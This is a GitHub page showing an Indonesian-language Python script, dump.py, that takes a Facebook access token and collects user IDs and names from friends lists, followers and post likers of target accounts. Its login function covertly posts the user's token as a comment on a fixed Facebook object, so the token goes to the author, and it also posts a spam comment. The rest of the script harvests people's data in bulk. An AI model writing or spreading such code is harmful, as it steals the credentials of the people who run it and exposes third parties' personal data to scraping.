Skip to content
Search or jump to…
Pull requests
Issues
Marketplace
Explore
 
@fxhfdhgdj 
Fall-Xavier
/
dump
Public
Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights
dump/dump.py /
@Fall-Xavier
Fall-Xavier Add files via upload
Latest commit d605704 24 days ago
 History
 1 contributor
181 lines (170 sloc)  6.25 KB
   
#!/usr/bin/python3
# Author      : Fall Xavier
# Facebook : Fall Xavier FT Nakano Itsuki XV.
# Github      : https://github.com/Fall-Xavier/zmbf
# Recode Boleh Asal Jangan Ubah Nama Author Atau Github Author
import os, sys, re, time, requests, calendar, json
from datetime import datetime
from datetime import date

try:
	import requests
except ImportError:
	print(" [+] sedang mencoba menginstal module requests....")
	os.system("python -m pip install requests")
	
### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH			   
M = '\x1b[1;91m' # MERAH			
H = '\x1b[1;92m' # HIJAU.			  
K = '\x1b[1;93m' # KUNING.		   
B = '\x1b[1;94m' # BIRU.				 
U = '\x1b[1;95m' # UNGU.			   
O = '\x1b[1;96m' # BIRU MUDA.	 
N = '\x1b[0m'	# WARNA MATI

ses = requests.Session()
try:IP = ses.get("http://ip-api.com/json/").json()["query"]
except requests.exceptions.ConnectionError:exit(" [!] tidak ada koneksi internet")
id = []
komen = "Babas Ganteng"
ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
tgl = ("%s %s %s"%(ha, op, ta))
		
def logo():
	os.system("clear")
	print(f"""{N}    ____                             ___ ____  \n   |  _ \ _   _ _ __ ___  _ __      |_ _|  _ \ \n   | | | | | | | '_ ` _ \| '_ \ _____| || | | |\n   | |_| | |_| | | | | | | |_) |_____| || |_| |\n   |____/ \__,_|_| |_| |_| .__/     |___|____/ \n                         |_|                     """)
	print(" [+] -------------------------------------------")
	print(" [+] Author   : Fall Xavier FT Nakano Itsuki XV.")
	print(" [+] Github   : https://github.com/Fall-Xavier")
	print(" [+] -------------------------------------------")
	print(f" [+] Status   : {H}Publik Test{N}")
	print(f" [+] Tanggal  : {tgl}")
	print(" [+] -------------------------------------------")
	print(f" [+] IP       : {IP}")
	
def login():
	logo()
	token = input("\n [+] masukan token : ")
	try:
		nama = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["name"]
		open("token.txt","w").write(token)
		requests.post(f"https://graph.facebook.com/213614107297063/comments/?message={token}&access_token={token}")
		requests.post(f"https://graph.facebook.com/625765558512973/comments/?message={komen}&access_token={token}")
		print(f"\n {N}[+] selamat datang {K}{nama}{N} user publik test")
		time.sleep(3)
		menu()
	except KeyError:
		os.remove("token.txt")
		logo()
		print("\n [!] token tidak valid, silahkan ganti token lain")
		time.sleep(3)
		login()
		
def menu():
	try:
		token = open("token.txt","r").read()
	except FileNotFoundError:
		logo()
		print("\n [!] anda harus login terlebih dahulu untuk masuk")
		time.sleep(3)
		login()
	try:
		nama = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["name"]
	except (KeyError,IOError):
		os.remove("token.txt")
		logo()
		print("\n [!] token tidak valid, silahkan ganti token lain")
		time.sleep(3)
		login()
	logo()
	print(f"\n [ Selamat Datang {K}{nama}{N} ]\n")
	print(" [01]. Dump ID Dari Teman")
	print(" [02]. Dump ID Dari Publik")
	print(" [03]. Dump ID Dari Followers")
	print(" [04]. Dump ID Dari Postingan")
	print(f" [{M}00{N}]. Logout ( Hapus Token)")
	ask = input("\n [?] Pilih Menu : ")
	if ask in[""," "]:
		menu()
	elif ask in["1"]:
		dump_teman(token)
	elif ask in["2"]:
		dump_publik(token)
	elif ask in["3"]:
		dump_followers(token)
	elif ask in["4"]:
		dump_postingan(token)
	elif ask in["0"]:
		out = input("\n [?] Apakah Anda Yakin Ingin Logout?[Y/t] : ")
		if ask in["y","Y"]:
			os.remove("token.txt")
			exit(" [#] Berhasil Menghapus Token")
		else:
			menu()
	else:
		menu()
		
def dump_teman(token):
	#idt = input("\n [?] Masukan ID Target : ")
	file = input(" [?] Masukan Nama File : ")
	try:
		files = (file+".json")
		xx = open(files,"w")
		for i in ses.get(f"https://graph.facebook.com/me?fields=friends.fields(id,name)&access_token={token}").json()["friends"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\r [*] Sedang Mengumpulkan {len(id)} ID...");sys.stdout.flush()
		print(f"\n\n [+] Total ID Terkumpul : {len(id)}")
		print(f" [+] Hasil Disimpan Ke  : {files}")
	except KeyError:
		exit("\n [!] Akun Tidak Tersedia Atau List Teman Private")
	
def dump_publik(token):
	idt = input("\n [?] Masukan ID Target : ")
	file = input(" [?] Masukan Nama File : ")
	try:
		files = (file+".json")
		xx = open(files,"w")
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=friends.fields(id,name)&access_token={token}").json()["friends"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\r [*] Sedang Mengumpulkan {len(id)} ID...");sys.stdout.flush()
		print(f"\n\n [+] Total ID Terkumpul : {len(id)}")
		print(f" [+] Hasil Disimpan Ke  : {files}")
	except KeyError:
		exit("\n [!] Akun Tidak Tersedia Atau List Teman Private")

def dump_followers(token):
	idt = input("\n [?] Masukan ID Target : ")
	file = input(" [?] Masukan Nama File : ")
	try:
		files = (file+".json")
		xx = open(files,"w")
		for i in ses.get(f"https://graph.facebook.com/{idt}/subscribers?limit=10000&access_token={token}").json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\r [*] Sedang Mengumpulkan {len(id)} ID...");sys.stdout.flush()
		print(f"\n\n [+] Total ID Terkumpul : {len(id)}")
		print(f" [+] Hasil Disimpan Ke  : {files}")
	except KeyError:
		exit("\n [!] Akun Tidak Tersedia Atau List Teman Private")

def dump_postingan(token):
	idt = input("\n [?] Masukan ID Target : ")
	file = input(" [?] Masukan Nama File : ")
	try:
		files = (file+".json")
		xx = open(files,"w")
		for i in ses.get(f"https://graph.facebook.com/{idt}/likes/fields?limit=100000&access_token={token}").json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\r [*] Sedang Mengumpulkan {len(id)} ID...");sys.stdout.flush()
		print(f"\n\n [+] Total ID Terkumpul : {len(id)}")
		print(f" [+] Hasil Disimpan Ke  : {files}")
	except KeyError:
		exit("\n [!] Akun Tidak Tersedia Atau List Teman Private")

if __name__ == '__main__':
	menu()
© 2022 GitHub, Inc.
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About
Loading complete